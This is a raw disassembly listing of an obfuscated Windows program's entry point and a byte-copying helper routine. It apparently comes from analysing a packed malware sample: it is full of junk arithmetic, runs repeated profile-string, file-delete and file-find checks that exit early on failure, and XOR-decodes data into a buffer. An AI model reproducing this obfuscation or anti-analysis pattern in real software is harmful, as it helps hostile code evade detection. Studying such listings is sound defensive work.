
start:
0x0042399a:	pushl	%ebp
0x0042399b:	movl	%esp, %ebp
0x0042399d:	andl	$0xfffffff8, %esp
0x004239a0:	addl	$0x42a1bb, 0x0042a177
0x004239aa:	subl	$0x1ac, %esp
0x004239b0:	pushl	%ebx
0x004239b1:	pushl	%esi
0x004239b2:	movl	$0x573c, 0x0042a15f
0x004239bc:	pushl	%edi
0x004239bd:	xorl	%edi, %edi
0x004239bf:	pushl	%edi
0x004239c0:	notl	0x0042a18f
0x004239c6:	call	GetDC@user32.dll	; targets: 0xff000020(MAY)
0x004239cc:	movl	GetProfileStringW@kernel32.dll, %esi
0x004239d2:	addl	$0x7d28, 0x0042a14b
0x004239dc:	pushl	$0xf
0x004239de:	andl	$0x1edb, 0x0042a183
0x004239e8:	movl	%eax, 0x14(%esp)
0x004239ec:	leal	0x44(%esp), %eax
0x004239f0:	subl	$0x42a187, 0x0042a19b
0x004239fa:	pushl	%eax
0x004239fb:	pushl	$0x429553
0x00423a00:	sbbl	$0x7a6, 0x0042a17f
0x00423a0a:	pushl	$0x429567
0x00423a0f:	adcl	$0x6000, 0x0042a17f
0x00423a19:	pushl	$0x42958f
0x00423a1e:	adcl	$0x42a1b7, 0x0042a1c3
0x00423a28:	call	%esi	; targets: 0xff000040(MAY)
0x00423a2a:	shll	$0x15, %eax
0x00423a2d:	movl	$0x6670, 0x0042a197
0x00423a37:	cmpl	$0x1000000, %eax
0x00423a3c:	je	0x00423a53	; targets: 0x00423a53(MAY), 0x00423a42(MAY)
0x00423a42:	xorl	%eax, %eax	; from: 0x0042415b(MAY), 0x00423d85(MAY), 0x004241d0(MAY), 0x00423ab5(MAY), 0x00423a3c(MAY), 0x00424138(MAY), 0x00423db2(MAY), 0x004241b3(MAY), 0x0042436f(MAY), 0x0042411b(MAY), 0x004242cd(MAY), 0x0042425f(MAY), 0x0042428c(MAY), 0x00423a7e(MAY), 0x00424338(MAY), 0x00423de9(MAY), 0x004241fd(MAY), 0x00424311(MAY)
0x00423a44:	movl	$0x1037, 0x0042a12f
0x00423a4e:	jmp	0x00424b0a	; targets: 0x00424b0a(MAY)
0x00423a53:	orl	$0x42a127, 0x0042a187	; from: 0x00423a3c(MAY)
0x00423a5d:	pushl	$0x4295b7
0x00423a62:	call	DeleteFileA@kernel32.dll	; targets: 0xff0000d0(MAY)
0x00423a68:	xorl	$0x42a1b3, 0x0042a15b
0x00423a72:	testl	%eax, %eax
0x00423a74:	movl	$0x194e, 0x0042a137
0x00423a7e:	jne	0x00423a42	; targets: 0x00423a42(MAY), 0x00423a84(MAY)
0x00423a84:	leal	0x78(%esp), %eax	; from: 0x00423a7e(MAY)
0x00423a88:	xorl	$0x42a157, 0x0042a173
0x00423a92:	pushl	%eax
0x00423a93:	pushl	$0x4295d3
0x00423a98:	sbbl	$0x42a133, 0x0042a1ab
0x00423aa2:	call	FindFirstFileA@kernel32.dll	; targets: 0xff0000e0(MAY)
0x00423aa8:	cmpl	$0xffffffff, %eax
0x00423aab:	movl	$0x52a3, 0x0042a193
0x00423ab5:	jne	0x00423a42	; targets: 0x00423abb(MAY), 0x00423a42(MAY)
0x00423abb:	movl	$0xfae, 0x0042a19b	; from: 0x00423ab5(MAY)
0x00423ac5:	pushl	0x10(%esp)
0x00423ac9:	addl	$0x42a16f, 0x0042a157
0x00423ad3:	pushl	%edi
0x00423ad4:	sbbl	$0x76dd, 0x0042a1c3
0x00423ade:	call	ReleaseDC@user32.dll	; targets: 0xff000090(MAY)
0x00423ae4:	movl	0x0042a24f, %ecx
0x00423aea:	movl	0x0042a267, %ebx
0x00423af0:	subl	%ebx, %ecx
0x00423af2:	subl	(%ecx,%ebx), %ecx
0x00423af5:	movl	%edi, 0x30(%esp)
0x00423af9:	orl	$0x565, 0x0042a16f
0x00423b03:	movl	$0xf89c85b9, 0x20(%esp)
0x00423b0b:	movl	$0x78c3, 0x0042a143
0x00423b15:	movl	$0xf89c85ba, 0xc(%esp)
0x00423b1d:	orl	%ecx, %ebx
0x00423b1f:	leal	0x3c(%esp), %eax
0x00423b23:	movl	%eax, 0x30(%esp)
0x00423b27:	addl	%edi, %ebx
0x00423b29:	leal	0x38(%esp), %eax
0x00423b2d:	movl	0x0042a1e3, %edi
0x00423b33:	movl	0x0042a21f, %ecx
0x00423b39:	subl	%ecx, %edi
0x00423b3b:	andl	(%edi,%ecx), %edi
0x00423b3e:	movl	%eax, 0x10(%esp)
0x00423b42:	andl	$0x5d3c, 0x0042a17b
0x00423b4c:	movl	0x0042942f, %eax
0x00423b51:	xorl	%ebx, %ebx
0x00423b53:	xorl	0x0042a18b, %ebx
0x00423b59:	sbbl	%ebx, 0x0042a1bf
0x00423b5f:	movl	0x1c8(%eax), %eax
0x00423b65:	sbbl	0x0042a1cf, %edi
0x00423b6b:	movl	(%eax), %eax
0x00423b6d:	andl	$0x0, 0x0042a173
0x00423b77:	movl	0x0042a173, %edi
0x00423b7d:	incl	%edi
0x00423b7e:	movl	%edi, 0x0042a173
0x00423b84:	cmpl	$0xf, 0x0042a173
0x00423b8b:	jl	0x00423bd0	; targets: 0x00423bd0(MAY)
0x00423bd0:	movl	0x10(%esp), %ecx	; from: 0x00423b8b(MAY)
0x00423bd4:	andl	0x0042a1ab, %ebx
0x00423bda:	movl	$0x75108a8, %edi
0x00423bdf:	xorl	0x0042a173, %ebx
0x00423be5:	xorl	%edi, %eax
0x00423be7:	movl	0x0042a18b, %ebx
0x00423bed:	orl	%ebx, 0x0042a13f
0x00423bf3:	movl	$0x3272ef, %ebx
0x00423bf8:	addl	%ebx, %eax
0x00423bfa:	movl	$0x4871, 0x0042a1c3
0x00423c04:	movl	%eax, (%ecx)
0x00423c06:	movl	0x0042a193, %eax
0x00423c0b:	movl	0x00429feb, %eax
0x00423c10:	cmpl	$0x445cecf9, %eax
0x00423c15:	jne	0x00423c95	; targets: 0x00423c1b(MAY)
0x00423c1b:	sbbl	$0x3851, %ecx	; from: 0x00423c15(MAY)
0x00423c21:	movl	0x20(%esp), %eax
0x00423c25:	subl	%edi, 0x0042a16b
0x00423c2b:	movl	0x0042942f, %ecx
0x00423c31:	movl	0x198(%ecx), %ecx
0x00423c37:	adcl	$0x1545, 0x0042a14b
0x00423c41:	xorl	%edi, %eax
0x00423c43:	addl	%ebx, %eax
0x00423c45:	movl	%eax, (%ecx)
0x00423c47:	xorl	0x0042a19f, %eax
0x00423c4d:	movl	0x20(%esp), %eax
0x00423c51:	subl	$0x2657, 0x0042a13f
0x00423c5b:	xorl	%edi, %eax
0x00423c5d:	addl	%ebx, %eax
0x00423c5f:	movl	%eax, 0x00429feb
0x00423c64:	decl	0x0042a18b
0x00423c6a:	movl	0x20(%esp), %eax
0x00423c6e:	xorl	$0x42a1af, 0x0042a15b
0x00423c78:	xorl	%edi, %eax
0x00423c7a:	sbbl	$0xceb, 0x0042a157
0x00423c84:	addl	%ebx, %eax
0x00423c86:	sbbl	$0x42a19f, 0x0042a177
0x00423c90:	movl	%eax, 0x00429527
0x00423c95:	subl	$0xfb3, %eax
0x00423c9a:	movl	0x0042942f, %eax
0x00423c9f:	notl	0x0042a1a3
0x00423ca5:	movl	0x18c(%eax), %eax
0x00423cab:	subl	$0x42a19b, 0x0042a133
0x00423cb5:	movl	(%eax), %eax
0x00423cb7:	notl	0x0042a133
0x00423cbd:	movl	%eax, 0x60(%esp)
0x00423cc1:	adcl	$0x42a1af, 0x0042a1c7
0x00423ccb:	movl	$0xf89c85bd, %eax
0x00423cd0:	movl	%eax, 0x18(%esp)
0x00423cd4:	sbbl	$0x42a177, 0x0042a17f
0x00423cde:	movl	%eax, 0x18(%esp)
0x00423ce2:	subl	$0x5dcc, 0x0042a143
0x00423cec:	movl	%eax, 0x18(%esp)
0x00423cf0:	movl	$0xf89c85b9, 0x18(%esp)
0x00423cf8:	sbbl	$0x2005, 0x0042a1a3
0x00423d02:	movl	%eax, 0x10(%esp)
0x00423d06:	movl	$0x202e, 0x0042a1a7
0x00423d10:	movl	$0xf89c85b1, 0x10(%esp)
0x00423d18:	movl	0x20(%esp), %eax
0x00423d1c:	addl	$0x42a19f, 0x0042a187
0x00423d26:	xorl	%edi, %eax
0x00423d28:	orl	$0x42a163, 0x0042a15b
0x00423d32:	addl	%ebx, %eax
0x00423d34:	jmp	0x00423fe4	; targets: 0x00423fe4(MAY)
0x00423d39:	decl	0x0042a143	; from: 0x0042403f(MAY)
0x00423d3f:	leal	0x44(%esp), %eax
0x00423d43:	adcl	$0x2f79, 0x0042a16f
0x00423d4d:	pushl	%eax
0x00423d4e:	xorl	$0x2364, 0x0042a13b
0x00423d58:	pushl	$0x4295ef
0x00423d5d:	pushl	$0x429603
0x00423d62:	pushl	$0x42962b
0x00423d67:	subl	$0x2bd1, 0x0042a16b
0x00423d71:	call	%esi	; targets: 0xff000040(MAY)
0x00423d73:	movl	$0x6294, 0x0042a147
0x00423d7d:	shll	$0x15, %eax
0x00423d80:	cmpl	$0x1000000, %eax
0x00423d85:	jne	0x00423a42	; targets: 0x00423a42(MAY), 0x00423d8b(MAY)
0x00423d8b:	decl	0x0042a163	; from: 0x00423d85(MAY)
0x00423d91:	pushl	$0x429653
0x00423d96:	adcl	$0x42a1af, 0x0042a1cb
0x00423da0:	call	DeleteFileA@kernel32.dll	; targets: 0xff0000d0(MAY)
0x00423da6:	addl	$0x6241, 0x0042a14b
0x00423db0:	testl	%eax, %eax
0x00423db2:	jne	0x00423a42	; targets: 0x00423a42(MAY), 0x00423db8(MAY)
0x00423db8:	orl	$0x259a, 0x0042a133	; from: 0x00423db2(MAY)
0x00423dc2:	leal	0x78(%esp), %eax
0x00423dc6:	pushl	%eax
0x00423dc7:	pushl	$0x42966f
0x00423dcc:	xorl	$0x66c, 0x0042a17b
0x00423dd6:	call	FindFirstFileA@kernel32.dll	; targets: 0xff0000e0(MAY)
0x00423ddc:	cmpl	$0xffffffff, %eax
0x00423ddf:	movl	$0x7420, 0x0042a187
0x00423de9:	jne	0x00423a42	; targets: 0x00423def(MAY), 0x00423a42(MAY)
0x00423def:	andl	$0x0, 0x0042a167	; from: 0x00423de9(MAY)
0x00423df9:	movl	0x0042a167, %eax
0x00423dfe:	incl	%eax
0x00423dff:	movl	%eax, 0x0042a167
0x00423e04:	cmpl	$0x5, 0x0042a167
0x00423e0b:	jl	0x00423e53	; targets: 0x00423e53(MAY)
0x00423e53:	movl	0xc(%esp), %eax	; from: 0x00423e0b(MAY)
0x00423e57:	movl	0x10(%esp), %ecx
0x00423e5b:	decl	0x0042a15f
0x00423e61:	xorl	%edi, %eax
0x00423e63:	subl	$0x2267, 0x0042a1a7
0x00423e6d:	leal	0x3272ef(%eax,%ecx), %eax
0x00423e74:	sbbl	$0x1a84, 0x0042a1bb
0x00423e7e:	pushl	%eax
0x00423e7f:	andl	$0x0, 0x0042a15f
0x00423e89:	jmp	0x00423e99	; targets: 0x00423e99(MAY)
0x00423e99:	cmpl	$0x12, 0x0042a15f	; from: 0x00423e89(MAY)
0x00423ea0:	jae	0x00423ed1	; targets: 0x00423ea6(MAY)
0x00423ea6:	cmpl	$0x21, 0x0042a15f	; from: 0x00423ea0(MAY)
0x00423ead:	jb	0x00423ed1	; targets: 0x00423ed1(MAY)
0x00423ed1:	movl	0x1c(%esp), %eax	; from: 0x00423ead(MAY)
0x00423ed5:	addl	$0x42a19f, 0x0042a1c3
0x00423edf:	xorl	%edi, %eax
0x00423ee1:	adcl	$0x3c17, 0x0042a147
0x00423eeb:	leal	0x3272f7(%ebp,%eax), %eax
0x00423ef2:	andl	$0x7df0, 0x0042a18b
0x00423efc:	pushl	%eax
0x00423efd:	movl	0x0042a12b, %eax
0x00423f02:	xorl	%eax, 0x0042a1ab
0x00423f08:	movl	0x0042942f, %eax
0x00423f0d:	xorl	$0x5716, 0x0042a147
0x00423f17:	pushl	0x1bc(%eax)
0x00423f1d:	incl	0x0042a1c3
0x00423f23:	call	0x00424b13	; targets: 0x00424b13(MAY)
0x00423f28:	addl	%ebx, 0x0042a18f	; from: 0x00424d4d(MAY)
0x00423f2e:	movl	0xc(%esp), %eax
0x00423f32:	andl	$0x0, 0x0042a18f
0x00423f3c:	movl	0x0042a18f, %ecx	; from: 0x00423f7c(MAY)
0x00423f42:	incl	%ecx
0x00423f43:	movl	%ecx, 0x0042a18f
0x00423f49:	cmpl	$0x23, 0x0042a18f
0x00423f50:	jg	0x00423f82	; targets: 0x00423f82(MAY), 0x00423f56(MAY)
0x00423f56:	jmp	0x00423f75	; targets: 0x00423f75(MAY)	; from: 0x00423f50(MAY)
0x00423f75:	cmpl	$0x1c, 0x0042a18f	; from: 0x00423f56(MAY)
0x00423f7c:	jb	0x00423f3c	; targets: 0x00423f82(MAY), 0x00423f3c(MAY)
0x00423f82:	movl	0x10(%esp), %ecx	; from: 0x00423f7c(MAY), 0x00423f50(MAY)
0x00423f86:	andl	$0x0, 0x0042a1a3
0x00423f90:	jmp	0x00423fa2	; targets: 0x00423fa2(MAY)
0x00423fa2:	cmpl	$0x15, 0x0042a1a3	; from: 0x00423f90(MAY)
0x00423fa9:	jae	0x00423fd1	; targets: 0x00423faf(MAY)
0x00423faf:	cmpl	$0x23, 0x0042a1a3	; from: 0x00423fa9(MAY)
0x00423fb6:	jl	0x00423fd1	; targets: 0x00423fd1(MAY)
0x00423fd1:	xorl	%edi, %eax	; from: 0x00423fb6(MAY)
0x00423fd3:	addl	$0x498, 0x0042a15b
0x00423fdd:	leal	0x3272ef(%ecx,%eax), %eax
0x00423fe4:	addl	$0x5749, 0x0042a1d3	; from: 0x00423d34(MAY)
0x00423fee:	movl	0xc(%esp), %ecx
0x00423ff2:	andl	%ecx, 0x0042a18f
0x00423ff8:	movl	0xc(%esp), %edx
0x00423ffc:	xorl	%edi, %edx
0x00423ffe:	xorl	%edi, %ecx
0x00424000:	addl	%edx, %ecx
0x00424002:	movl	0xc(%esp), %edx
0x00424006:	xorl	%edi, %edx
0x00424008:	movl	$0x7e75, 0x0042a15f
0x00424012:	leal	0x9758cd(%ecx,%edx), %ecx
0x00424019:	movl	$0x16f9, 0x0042a14b
0x00424023:	movl	%eax, 0x10(%esp)
0x00424027:	pushl	$0xf
0x00424029:	movl	$0x175a, 0x0042a1bb
0x00424033:	cmpl	%ecx, %eax
0x00424035:	movl	$0x2b18, 0x0042a15f
0x0042403f:	jbe	0x00423d39	; targets: 0x00424045(MAY), 0x00423d39(MAY)
0x00424045:	movl	0xc(%ebp), %eax	; from: 0x0042403f(MAY)
0x00424048:	addl	0x0042a173, %ecx
0x0042404e:	movl	%eax, 0x004292b3
0x00424053:	movl	0x10(%ebp), %eax
0x00424056:	xorl	%ecx, %ecx
0x00424058:	xorl	0x0042a1b3, %ecx
0x0042405e:	sbbl	%ecx, 0x0042a1cb
0x00424064:	movl	%eax, 0x0042950f
0x00424069:	movl	0x004292b3, %eax
0x0042406e:	movl	0x0042a12f, %ecx
0x00424074:	orl	0x0042a15f, %ecx
0x0042407a:	movl	%ecx, 0x0042a12f
0x00424080:	movl	0x34(%esp), %ecx
0x00424084:	adcl	$0x192d, 0x0042a1c7
0x0042408e:	subl	%ebx, %eax
0x00424090:	xorl	%edi, %eax
0x00424092:	orl	$0x42a1cb, 0x0042a1af
0x0042409c:	movl	%eax, (%ecx)
0x0042409e:	subl	$0x2768, 0x0042a187
0x004240a8:	leal	0x30(%esp), %eax
0x004240ac:	andl	$0x51d9, 0x0042a17b
0x004240b6:	movl	%eax, 0x74(%esp)
0x004240ba:	leal	0x4(%ebp), %eax
0x004240bd:	movl	%eax, 0x30(%esp)
0x004240c1:	leal	0x44(%esp), %eax
0x004240c5:	xorl	$0x6aa, 0x0042a1ab
0x004240cf:	pushl	%eax
0x004240d0:	subl	$0x42a18b, 0x0042a137
0x004240da:	pushl	$0x42968b
0x004240df:	pushl	$0x42969f
0x004240e4:	subl	$0x6538, 0x0042a12f
0x004240ee:	pushl	$0x4296c7
0x004240f3:	addl	$0x42a1cf, 0x0042a17f
0x004240fd:	call	%esi	; targets: 0xff000040(MAY)
0x004240ff:	shll	$0x15, %eax
0x00424102:	movl	$0x1cd6, 0x0042a1bf
0x0042410c:	cmpl	$0x1000000, %eax
0x00424111:	movl	$0x32c8, 0x0042a193
0x0042411b:	jne	0x00423a42	; targets: 0x00424121(MAY), 0x00423a42(MAY)
0x00424121:	pushl	$0x4296ef	; from: 0x0042411b(MAY)
0x00424126:	call	DeleteFileA@kernel32.dll	; targets: 0xff0000d0(MAY)
0x0042412c:	xorl	$0x42a177, 0x0042a16f
0x00424136:	testl	%eax, %eax
0x00424138:	jne	0x00423a42	; targets: 0x0042413e(MAY), 0x00423a42(MAY)
0x0042413e:	adcl	$0x7895, 0x0042a16f	; from: 0x00424138(MAY)
0x00424148:	leal	0x78(%esp), %eax
0x0042414c:	pushl	%eax
0x0042414d:	pushl	$0x42970b
0x00424152:	call	FindFirstFileA@kernel32.dll	; targets: 0xff0000e0(MAY)
0x00424158:	cmpl	$0xffffffff, %eax
0x0042415b:	jne	0x00423a42	; targets: 0x00423a42(MAY), 0x00424161(MAY)
0x00424161:	pushl	$0xf	; from: 0x0042415b(MAY)
0x00424163:	leal	0x44(%esp), %eax
0x00424167:	pushl	%eax
0x00424168:	subl	$0x42a167, 0x0042a19b
0x00424172:	pushl	$0x429727
0x00424177:	sbbl	$0x654e, 0x0042a18b
0x00424181:	pushl	$0x42973b
0x00424186:	pushl	$0x429763
0x0042418b:	addl	$0x4c0a, 0x0042a15f
0x00424195:	call	%esi	; targets: 0xff000040(MAY)
0x00424197:	shll	$0x15, %eax
0x0042419a:	movl	$0x49de, 0x0042a17b
0x004241a4:	cmpl	$0x1000000, %eax
0x004241a9:	movl	$0x39fb, 0x0042a1a7
0x004241b3:	jne	0x00423a42	; targets: 0x004241b9(MAY), 0x00423a42(MAY)
0x004241b9:	sbbl	$0x7658, 0x0042a1bb	; from: 0x004241b3(MAY)
0x004241c3:	pushl	$0x42978b
0x004241c8:	call	DeleteFileA@kernel32.dll	; targets: 0xff0000d0(MAY)
0x004241ce:	testl	%eax, %eax
0x004241d0:	jne	0x00423a42	; targets: 0x00423a42(MAY), 0x004241d6(MAY)
0x004241d6:	leal	0x78(%esp), %eax	; from: 0x004241d0(MAY)
0x004241da:	adcl	$0x33c9, 0x0042a14f
0x004241e4:	pushl	%eax
0x004241e5:	pushl	$0x4297a7
0x004241ea:	andl	$0x42a1c3, 0x0042a187
0x004241f4:	call	FindFirstFileA@kernel32.dll	; targets: 0xff0000e0(MAY)
0x004241fa:	cmpl	$0xffffffff, %eax
0x004241fd:	jne	0x00423a42	; targets: 0x00424203(MAY), 0x00423a42(MAY)
0x00424203:	addl	$0x42a1b3, 0x0042a14f	; from: 0x004241fd(MAY)
0x0042420d:	pushl	$0xf
0x0042420f:	adcl	$0x42a17b, 0x0042a14f
0x00424219:	leal	0x44(%esp), %eax
0x0042421d:	adcl	$0x4372, 0x0042a197
0x00424227:	pushl	%eax
0x00424228:	subl	$0x57ed, 0x0042a1c3
0x00424232:	pushl	$0x4297c3
0x00424237:	pushl	$0x4297d7
0x0042423c:	pushl	$0x4297ff
0x00424241:	sbbl	$0x42a1d3, 0x0042a143
0x0042424b:	call	%esi	; targets: 0xff000040(MAY)
0x0042424d:	shll	$0x15, %eax
0x00424250:	cmpl	$0x1000000, %eax
0x00424255:	movl	$0x7ab0, 0x0042a1bb
0x0042425f:	jne	0x00423a42	; targets: 0x00423a42(MAY), 0x00424265(MAY)
0x00424265:	andl	$0x42a16b, 0x0042a1b7	; from: 0x0042425f(MAY)
0x0042426f:	pushl	$0x429827
0x00424274:	negl	0x0042a13f
0x0042427a:	call	DeleteFileA@kernel32.dll	; targets: 0xff0000d0(MAY)
0x00424280:	testl	%eax, %eax
0x00424282:	movl	$0x529e, 0x0042a183
0x0042428c:	jne	0x00423a42	; targets: 0x00424292(MAY), 0x00423a42(MAY)
0x00424292:	orl	$0x42a13f, 0x0042a173	; from: 0x0042428c(MAY)
0x0042429c:	leal	0x78(%esp), %eax
0x004242a0:	pushl	%eax
0x004242a1:	adcl	$0x42a183, 0x0042a14b
0x004242ab:	pushl	$0x429843
0x004242b0:	call	FindFirstFileA@kernel32.dll	; targets: 0xff0000e0(MAY)
0x004242b6:	movl	$0x1720, 0x0042a167
0x004242c0:	cmpl	$0xffffffff, %eax
0x004242c3:	movl	$0x34b9, 0x0042a1b3
0x004242cd:	jne	0x00423a42	; targets: 0x004242d3(MAY), 0x00423a42(MAY)
0x004242d3:	xorl	$0x42a193, 0x0042a127	; from: 0x004242cd(MAY)
0x004242dd:	pushl	$0xf
0x004242df:	leal	0x44(%esp), %eax
0x004242e3:	pushl	%eax
0x004242e4:	pushl	$0x42985f
0x004242e9:	sbbl	$0x42a14b, 0x0042a13f
0x004242f3:	pushl	$0x429873
0x004242f8:	pushl	$0x42989b
0x004242fd:	call	%esi	; targets: 0xff000040(MAY)
0x004242ff:	movl	$0x7c87, 0x0042a183
0x00424309:	shll	$0x15, %eax
0x0042430c:	cmpl	$0x1000000, %eax
0x00424311:	jne	0x00423a42	; targets: 0x00424317(MAY), 0x00423a42(MAY)
0x00424317:	subl	$0x1b5, 0x0042a14f	; from: 0x00424311(MAY)
0x00424321:	pushl	$0x4298c3
0x00424326:	adcl	$0x2d72, 0x0042a15f
0x00424330:	call	DeleteFileA@kernel32.dll	; targets: 0xff0000d0(MAY)
0x00424336:	testl	%eax, %eax
0x00424338:	jne	0x00423a42	; targets: 0x00423a42(MAY), 0x0042433e(MAY)
0x0042433e:	xorl	$0x5023, 0x0042a177	; from: 0x00424338(MAY)
0x00424348:	leal	0x78(%esp), %eax
0x0042434c:	addl	$0x39d, 0x0042a19b
0x00424356:	pushl	%eax
0x00424357:	pushl	$0x4298df
0x0042435c:	call	FindFirstFileA@kernel32.dll	; targets: 0xff0000e0(MAY)
0x00424362:	movl	$0xd24, 0x0042a16f
0x0042436c:	cmpl	$0xffffffff, %eax
0x0042436f:	jne	0x00423a42	; targets: 0x00424375(MAY), 0x00423a42(MAY)
0x00424375:	notl	0x0042a157	; from: 0x0042436f(MAY)
0x0042437b:	pushl	$0xf
0x0042437d:	movl	$0x1e5a, 0x0042a197
0x00424387:	leal	0x44(%esp), %eax
0x0042438b:	pushl	%eax
0x0042438c:	pushl	$0x4298fb
0x00424391:	pushl	$0x42990f
0x00424396:	pushl	$0x429937
0x0042439b:	addl	$0x42a1a7, 0x0042a17f
0x004243a5:	call	%esi	; targets: 0xff000040(MAY)
0x00424b0a:	popl	%edi	; from: 0x00423a4e(MAY)
0x00424b0b:	popl	%esi
0x00424b0c:	popl	%ebx
0x00424b0d:	movl	%ebp, %esp
0x00424b0f:	popl	%ebp
0x00424b10:	ret	$0xc	; targets: 0xfee70000(MAY)

0x00424b13:	pushl	%ebp	; from: 0x00423f23(MAY)
0x00424b14:	movl	%esp, %ebp
0x00424b16:	subl	$0x10, %esp
0x00424b19:	andl	$0x0, 0x0042a17f
0x00424b23:	xorl	%edx, %edx
0x00424b25:	addl	0x0042a17f, %edx
0x00424b2b:	incl	%edx
0x00424b2c:	movl	%edx, 0x0042a17f
0x00424b32:	cmpl	$0xc, 0x0042a17f
0x00424b39:	jb	0x00424b79	; targets: 0x00424b79(MAY)
0x00424b79:	movl	$0xf89c85b9, %eax	; from: 0x00424b39(MAY)
0x00424b7e:	movl	%eax, -4(%ebp)
0x00424b81:	sbbl	%edx, %ecx
0x00424b83:	movl	$0xf89c85ba, -8(%ebp)
0x00424b8a:	movl	-4(%ebp), %ecx
0x00424b8d:	movl	$0x13, 0x0042a1bb
0x00424b97:	cmpl	$0x0, 0x0042a1bb
0x00424b9e:	je	0x00424bd8	; targets: 0x00424ba4(MAY)
0x00424ba4:	cmpl	$0x1e, 0x0042a1bb	; from: 0x00424b9e(MAY)
0x00424bab:	jbe	0x00424bd8	; targets: 0x00424bd8(MAY)
0x00424bd8:	pushl	%esi	; from: 0x00424bab(MAY)
0x00424bd9:	subl	%ecx, 0x0042a1c7
0x00424bdf:	movl	$0x75108a8, %edx
0x00424be4:	addl	%edi, 0x0042a197
0x00424bea:	xorl	%edx, %ecx
0x00424bec:	negl	%esi
0x00424bee:	movl	$0x3272ef, %esi
0x00424bf3:	adcl	$0x42a12f, 0x0042a133
0x00424bfd:	pushl	%edi
0x00424bfe:	movl	0x10(%ebp), %edi
0x00424c01:	addl	%esi, %ecx
0x00424c03:	movl	$0x8eb, 0x0042a1a7
0x00424c0d:	cmpl	%edi, %ecx
0x00424c0f:	movl	$0x4f38, 0x0042a1a7
0x00424c19:	je	0x00424d4a	; targets: 0x00424c1f(MAY)
0x00424c1f:	movl	$0x14, 0x0042a1c7	; from: 0x00424c19(MAY)
0x00424c29:	cmpl	$0x0, 0x0042a1c7	; from: 0x00424c86(MAY)
0x00424c30:	je	0x00424c8b	; targets: 0x00424c8b(MAY), 0x00424c36(MAY)
0x00424c36:	cmpl	$0xb, 0x0042a1c7	; from: 0x00424c30(MAY)
0x00424c3d:	jle	0x00424c8b	; targets: 0x00424c8b(MAY), 0x00424c43(MAY)
0x00424c43:	jmp	0x00424c5d	; targets: 0x00424c5d(MAY)	; from: 0x00424c3d(MAY)
0x00424c5d:	cmpl	$0xc, 0x0042a1c7	; from: 0x00424c43(MAY)
0x00424c64:	jne	0x00424c77	; targets: 0x00424c6a(MAY), 0x00424c77(MAY)
0x00424c6a:	movl	0x0042a1c7, %ecx	; from: 0x00424c64(MAY)
0x00424c70:	decl	%ecx
0x00424c71:	movl	%ecx, 0x0042a1c7
0x00424c77:	xorl	%ecx, %ecx	; from: 0x00424c64(MAY)
0x00424c79:	addl	0x0042a1c7, %ecx
0x00424c7f:	decl	%ecx
0x00424c80:	movl	%ecx, 0x0042a1c7
0x00424c86:	jmp	0x00424c29	; targets: 0x00424c29(MAY)
0x00424c8b:	movl	-4(%ebp), %ecx	; from: 0x00424c30(MAY), 0x00424c3d(MAY)
0x00424c8e:	movl	0x10(%ebp), %edi
0x00424c91:	xorl	%eax, %eax
0x00424c93:	xorl	%edx, %ecx
0x00424c95:	addl	%esi, %ecx
0x00424c97:	addl	$0xfabdbeda, %edi
0x00424c9d:	adcl	$0xffffffff, %eax
0x00424ca0:	xorl	$0x0, %eax
0x00424ca3:	movl	%eax, -12(%ebp)
0x00424ca6:	pushl	%ebx
0x00424ca7:	xorl	%ebx, %ebx
0x00424ca9:	xorl	$0x8a29a13b, %edi
0x00424caf:	movl	%ecx, %eax
0x00424cb1:	addl	$0xfabdbeda, %eax
0x00424cb6:	adcl	$0xffffffff, %ebx
0x00424cb9:	xorl	$0x8a29a13b, %eax
0x00424cbe:	xorl	$0x0, %ebx
0x00424cc1:	cmpl	%edi, %eax
0x00424cc3:	jne	0x00424cdc	; targets: 0x00424cdc(MAY)
0x00424cd7:	movl	$0x3272ef, %esi	; from: 0x00424d36(MAY)
0x00424cdc:	movl	-4(%ebp), %eax	; from: 0x00424cc3(MAY)
0x00424cdf:	movl	-8(%ebp), %edi
0x00424ce2:	xorl	%edx, %edi
0x00424ce4:	addl	%esi, %edi
0x00424ce6:	movl	0x8(%ebp), %esi
0x00424ce9:	imull	%ecx, %edi
0x00424cec:	movl	0xc(%ebp), %ebx
0x00424cef:	xorl	%edx, %eax
0x00424cf1:	addl	%ecx, %eax
0x00424cf3:	movb	0x3272ef(%ebx,%eax), %al
0x00424cfa:	movb	%al, (%edi,%esi)
0x00424cfd:	movl	-8(%ebp), %eax
0x00424d00:	movl	0x10(%ebp), %esi
0x00424d03:	xorl	%edx, %eax
0x00424d05:	xorl	%ebx, %ebx
0x00424d07:	addl	$0xfabdbeda, %esi
0x00424d0d:	adcl	$0xffffffff, %ebx
0x00424d10:	leal	0x3272ef(%ecx,%eax), %ecx
0x00424d17:	xorl	%edi, %edi
0x00424d19:	xorl	$0x8a29a13b, %esi
0x00424d1f:	xorl	$0x0, %ebx
0x00424d22:	movl	%ecx, %eax
0x00424d24:	addl	$0xfabdbeda, %eax
0x00424d29:	adcl	$0xffffffff, %edi
0x00424d2c:	xorl	$0x8a29a13b, %eax
0x00424d31:	xorl	$0x0, %edi
0x00424d34:	cmpl	%esi, %eax
0x00424d36:	jne	0x00424cd7	; targets: 0x00424d3c(MAY), 0x00424cd7(MAY)
0x00424d3c:	cmpl	%ebx, %edi	; from: 0x00424d36(MAY)
0x00424d3e:	jne	0x00424cd7	; targets: 0x00424d44(MAY)
0x00424d44:	movl	$0xf89c85ba, %eax	; from: 0x00424d3e(MAY)
0x00424d49:	popl	%ebx
0x00424d4a:	popl	%edi
0x00424d4b:	popl	%esi
0x00424d4c:	leave	
0x00424d4d:	ret	$0xc	; targets: 0x00423f28(MAY)

